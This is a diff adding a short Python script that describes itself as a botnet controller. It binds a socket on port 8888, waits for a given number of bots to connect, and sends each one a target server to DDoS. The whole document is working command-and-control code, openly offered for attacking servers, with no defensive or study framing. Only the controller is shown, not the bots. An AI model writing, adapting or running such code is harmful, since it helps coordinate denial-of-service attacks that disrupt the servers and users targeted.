@@ -1,0 +1,36 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+'''
+A controller of a botnet
+'''
+
+import argparse
+import socket
+
+if __name__ == '__main__':
+    PARSER = argparse.ArgumentParser(
+        description="A botnet commander that issues a target for the bots to DDoS"
+    )
+    PARSER.add_argument("-n", "--num-bots", dest="num_bots", action="store",
+                        default=1, type=int,
+                        help="Number of bots to command")
+    PARSER.add_argument("-t", "--target", dest="target", action="store",
+                        default=None, type=str,
+                        help="Target to attack")
+    ARGS = PARSER.parse_args()
+    TARGET = bytes(
+        ARGS.target if ARGS.target else input("What server do you want to attack? "),
+        "UTF-8"
+    )
+    NUM_BOTS = ARGS.num_bots
+    print(f"Attacking {TARGET.decode()} with {ARGS.num_bots} bot{'s' if ARGS.num_bots > 1 else ''}")
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind(("", 8888))
+        s.listen(1)
+        for _ in range(ARGS.num_bots):
+            conn, addr = s.accept()
+            print(f"Ordering {addr[0]}:{addr[1]} to attack")
+            with conn:
+                conn.sendall(TARGET)
+    print("Done.")
